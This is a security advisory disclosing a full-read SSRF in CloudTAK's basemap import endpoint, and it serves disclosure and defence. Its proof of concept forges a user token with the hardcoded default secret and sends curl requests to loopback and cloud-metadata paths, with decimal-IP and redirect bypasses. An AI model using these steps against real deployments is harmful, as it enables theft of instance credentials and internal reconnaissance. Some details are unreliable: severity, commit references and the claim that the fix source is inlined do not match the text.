# [M] TAK-PS-Stats Web UI: Authenticated full-read SSRF in CloudTAK basemap import (PUT /api/basemap) — no IP-classification guard

## Summary
Severity: Medium
Advisory: GHSA-vqrw-qphh-p34v
CVE: CVE-2026-54546
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-vqrw-qphh-p34v
Type: github-advisory

## Affected
- npm: `@tak-ps/cloudtak` — affected >=0

## Details
### Summary

`PUT /api/basemap` (the basemap import endpoint) fetches an attacker-supplied URL server-side with **no SSRF protection whatsoever**. Any authenticated user can submit a JSON body `{ "type": "...", "url": "<attacker url>" }`; the server calls `fetch(url)` against that URL and then reflects the response body (`name`, `attribution`, `tiles[0]`, zoom levels) back to the caller in the `OptionalTileJSON` response.

Because there is no IP-address classification, internal-only services are reachable: cloud metadata (`http://169.254.169.254/...`), loopback (`http://127.0.0.1/...`), RFC1918 ranges, and CGNAT. The response body flows back to the attacker, making this a **full-read SSRF** (not blind): the attacker reads the internal HTTP response verbatim. This enables theft of cloud instance credentials, internal service enumeration, and reading of internal-only HTTP endpoints from the network position of the CloudTAK API server.

The only URL check in the basemap protocol layer (`BasemapProtocol.isValidURL`, `api/lib/interface-basemap.ts`) validates the scheme is `http`/`https` only and performs **no host/IP filtering** — and the import path does not even call it; it goes straight from `new URL(rawURL)` to `fetch(url)`.

Three independent bypass classes were confirmed end-to-end against a real deployed build:
1. Direct internal/loopback IP literals.
2. Alternate IP encodings (e.g. decimal `http://2130706433/` = `127.0.0.1`).
3. Redirect following — `fetch` uses the default `redirect: 'follow'`, so even a public initial host that 302-redirects to an internal address is followed with no re-validation.

### Vulnerable code (file:line)

`api/routes/basemap.ts` — `importBasemapURL()` and the `PUT /basemap` handler (line numbers at commit `90d43bdd2fb7d9bd57cbce28c709d9e5207a475a`):

https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136

```ts
// api/routes/basemap.ts
async function importBasemapURL(
    config: Config,
    rawURL: string,
    auth?: Static<typeof BasemapImportAuth>,
): Promise<Static<typeof OptionalTileJSON>> {
    const imported: Static<typeof OptionalTileJSON> = { type: Basemap_Type.RASTER };

    let url: URL;
    try {
        url = new URL(rawURL);            // (1) only well-formedness is checked
    } catch (err) {
        throw new Err(400, err instanceof Error ? err : new Error(String(err)), 'Invalid URL');
    }

    if (isEsriLayerURL(String(url))) { /* ... ESRI proxy path ... */ }

    const tjres = await fetch(url);        // (2) SSRF sink — no host/IP guard, default redirect:follow
    if (!tjres.ok) throw new Err(400, null, 'Unable to fetch TileJSON from source URL');

    const tjbody = await tjres.json() as Record<string, any>;
    if (tjbody.name) imported.name = tjbody.name;               // (3) internal response reflected to caller
    if (tjbody.attribution) imported.attribution = tjbody.attribution;
    if (Array.isArray(tjbody.tiles) && tjbody.tiles.length) {
        imported.url = tjbody.tiles[0]...;
    }
    return imported;
}
```

The handler at `api/routes/basemap.ts` L139–L233 mounts this as `PUT /api/basemap` and gates it only with `Auth.is_auth(config, req)` (L157), i.e. **any authenticated user** with `application/json` body `{ type, url }` reaches `importBasemapURL((req.body).url, (req.body).auth)`.

`BasemapProtocol.isValidURL` at `api/lib/interface-basemap.ts` L136 — the only "validation" in the protocol layer — checks the scheme only and performs no IP filtering:

https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148

### How input reaches the sink

1. Attacker authenticates as any CloudTAK user (any role) and obtains a bearer token.
2. Attacker sends `PUT /api/basemap` with `Content-Type: application/json` and body `{ "type": "...", "url": "<attacker url>" }`.
3. Handler `api/routes/basemap.ts` L155–L233 calls `Auth.is_auth(config, req)` (L157, any authenticated user passes) then `importBasemapURL(config, (req.body).url, (req.body).auth)` (L233).
4. `importBasemapURL` (L68) does `new URL(rawURL)` (L79) and, for non-ESRI URLs, reaches `const tjres = await fetch(url)` (L99) — the SSRF sink. No host/IP classification occurs anywhere on this path; `fetch` uses the default `redirect: 'follow'`.
5. The response JSON is parsed (L104) and `name` / `attribution` / `tiles[0]` are copied into the response object (L106–L117) and returned to the attacker — closing the read loop.

### Impact

Server-side full-read SSRF from the network position of the CloudTAK API server, reachable by any single authenticated user:

- Read the cloud instance metadata endpoint (`http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`) and exfiltrate temporary IAM credentials.
- Reach and read internal-only HTTP services (databases' HTTP UIs, admin panels, other microservices) not exposed to the internet.
- Enumerate internal hosts/ports via response/timing differences.

Because the fetched body is reflected back to the caller, the attack is non-blind (full response disclosure), not merely a blind request-forgery.

### Proof of concept

End-to-end reproduction against a **real deployed CloudTAK API server** (not a unit harness). An internal-only sentinel HTTP service is bound to `127.0.0.1:9000` (loopback only, unreachable from outside the host) and returns a TileJSON body carrying secret marker values; the proof is that the CloudTAK server fetches it server-side and reflects those secrets back to the attacker.

1) Pinned install / build (v13.5.0, commit `64bc1886ff56b62f53d765d69ac90ff9fc23b54b`):

```bash
git clone https://github.com/dfpc-coe/CloudTAK.git
cd CloudTAK && git checkout v13.5.0
cd api && npm ci
# Postgres reachable at postgres://postgres@localhost:5432/tak_ps_etl (PostGIS-enabled)
```

2) Deploy the real API server (test stack: SigningSecret defaults to the hardcoded `coe-wildland-fire`, migrations auto-apply, a default server row is auto-generated):

```bash
cd api
StackName=test \
SigningSecret=coe-wildland-fire \
POSTGRES='postgres://postgres@localhost:5432/tak_ps_etl' \
API_URL='http://localhost:5001' \
npx tsx index.ts --noevents --nosinks --nogeofence
# => "ok - http://localhost:5001"
```

3) Internal-only sentinel (`internal_sentinel.js`) — simulates an internal HTTP service / metadata endpoint, bound to loopback only:

```js
const http = require('http');
const fs = require('fs');
const srv = http.createServer((req, res) => {
  fs.appendFileSync('/tmp/ssrf_sentinel_hits.log',
    `[HIT ${new Date().toISOString()}] ${req.method} ${req.url} from=${req.socket.remoteAddress}\n`);
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({
    name: 'INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c',
    attribution: 'leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e',
    tiles: ['http://127.0.0.1:9000/internal/{z}/{x}/{y}.png'],
    minzoom: 0, maxzoom: 19
  }));
});
srv.listen(9000, '127.0.0.1', () => console.log('sentinel on 127.0.0.1:9000 (internal-only)'));
```

```bash
node internal_sentinel.js &
# A redirector for the redirect-follow variant, also loopback-only:
node -e "require('http').createServer((q,r)=>{r.writeHead(302,{Location:'http://127.0.0.1:9000/via-302-redirect'});r.end();}).listen(9100,'127.0.0.1')" &
```

4) Attacker driver — mint a normal user JWT (signed with the deployed `SigningSecret`) and issue the three requests:

```bash
TOK=$(node -e "console.log(require('jsonwebtoken').sign({email:'attacker@evil.test',access:'user'},'coe-wildland-fire'))")

# (a) loopback / metadata-style path
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/"}'

# (b) decimal-IP encoding of 127.0.0.1
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://2130706433:9000/decimal-ip-bypass"}'

# (c) public-looking host that 302-redirects to internal (redirect:follow)
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9100/start"}'
```

5) Captured output — all three return the internal sentinel's secret body to the attacker, and the loopback-only sentinel records the server-side hits:

```
# HTTP response body returned to the attacker for (a), (b) and (c):
{"type":"raster","name":"INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c",
 "attribution":"leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e",
 "maxzoom":19,"minzoom":0,"url":"http://127.0.0.1:9000/internal/{$z}/{$x}/{$y}.png","format":"png"}

# /tmp/ssrf_sentinel_hits.log (sentinel is bound to 127.0.0.1 only):
[HIT 2026-06-03T05:01:13.606Z] GET /latest/meta-data/iam/security-credentials/ from=127.0.0.1
[HIT 2026-06-03T05:01:29.099Z] GET /decimal-ip-bypass from=127.0.0.1
[HIT 2026-06-03T05:01:30.151Z] GET /via-302-redirect from=127.0.0.1
```

The `name` and `attribution` values returned to the attacker are read verbatim from the internal service's HTTP response, demonstrating full-read SSRF. In a real cloud deployment the equivalent request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns instance-role credentials.

6) Negative control — a public host is fetched normally (the endpoint is not globally broken); only the *reachability* of internal addresses is the defect.

### End-to-end reproduction (against pinned version)

All of the above was executed against a real deployed CloudTAK API server built from tag `v13.5.0` (commit `64bc1886ff56b62f53d765d69ac90ff9fc23b54b`), booted with `StackName=test` against a PostGIS-enabled Postgres so migrations and routes load unmodified. The vulnerable build returned the internal sentinel's secret body (`INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c`, `leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e`) for all three bypass variants, and the loopback-only sentinel recorded the three server-side hits shown above.

After applying the fix below to the same deployed build and restarting, the exact same three attacker requests instead return:

```
{"status":403,"message":"URL resolves to a disallowed (internal) address","messages":[]}
```

and the sentinel log records **no** new hits, while `https://example.com/tile.json` continues to be fetched (returns `400 "Unable to fetch TileJSON"` — it reached the public host, the body just is not valid TileJSON). An `isBlockedIP` unit check passes 14/14: `169.254.169.254`, `127.0.0.1`, `10/8`, `172.16/12`, `192.168/16`, `100.64/10`, `::1`, `::ffff:127.0.0.1`, `fd00::/8`, `fe80::/10`, `64:ff9b::/96` all blocked; `8.8.8.8`, `1.1.1.1`, `93.184.216.34` all allowed.

### Suggested fix

Add an SSRF guard that (1) resolves the target hostname via DNS and rejects the request if **any** resolved address falls in a loopback / private / link-local (incl. `169.254.0.0/16` cloud metadata) / CGNAT / IPv6-ULA / IPv4-mapped / NAT64 range, and (2) follows redirects manually, re-validating the `Location` of every hop so a 302 to an internal address cannot bypass the check. Apply it to the import sink at `api/routes/basemap.ts` (the `fetch(url)` call) and to the ESRI/metadata fetch paths in the same file.

A self-contained `safeFetch(url)` helper (DNS resolution + per-hop re-validation) replacing the bare `fetch(url)` is sufficient; the same helper should back the other user-URL fetches in the basemap routes. A fix PR implementing exactly this guard is provided.

Note: a literal-string/prefix host blocklist (e.g. matching `127.`, `10.`, `192.168.`) is **not** sufficient — it is bypassed by alternate IP encodings, IPv6-mapped forms, and DNS-rebinding hostnames. The guard must classify the **resolved** numeric address.

### Severity

High. Pre-conditions: a single authenticated CloudTAK user account (any role). Impact: server-side full-read access to internal-only HTTP services and the cloud metadata endpoint from the API server's network position, enabling theft of instance credentials and internal reconnaissance. No additional privileges or victim interaction required.

### Fix PR link

A fix PR implementing the DNS-resolving, redirect-re-validating `safeFetch` guard described above is provided to the maintainers via the private temporary fork associated with this advisory. The full guard source is also inlined under the Suggested fix section's reasoning above; the patch adds `api/lib/ssrf-guard.ts` and replaces the bare `fetch(url)` at `api/routes/basemap.ts` with `safeFetch(url)`.

### Credits

Reported by tonghuaroot.

## References
- https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v
- https://github.com/dfpc-coe/CloudTAK
